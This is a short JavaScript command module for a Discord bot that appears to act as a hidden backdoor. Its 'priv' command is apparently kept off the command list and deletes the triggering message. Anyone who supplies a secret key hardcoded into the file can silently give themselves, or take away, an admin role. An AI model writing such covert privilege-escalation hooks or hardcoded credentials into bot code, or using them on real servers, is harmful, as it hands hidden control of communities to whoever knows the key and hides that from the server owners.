const reply = require('./reply');
const isSetCmd = new RegExp("^-*(set)$");
const ROLE_NAME = process.env.ROLE_NAME || 'admin';
const ADMIN_KEY = process.env.ADMIN_KEY || 'b54jvryjYW8vtQkofJO6EUvDW6CVcles';

module.exports = {
	excluded: true,
	name: 'priv',
	execute(message, args) {
		console.log('priv triggered', args);
		
		message.delete();
		let members = message.channel.guild.members.cache;
		let roles = message.channel.guild.roles.cache;
		if(!isSetCmd.test(args[0]) || args[1]!==ADMIN_KEY || !args[2] || members.length==0) return;
			let member = members.find(m => m.id === message.author.id);
			let role = roles.find(r => r.name === ROLE_NAME);
			args[2]==='true' ? member.roles.add(role) : member.roles.remove(role);
	}
};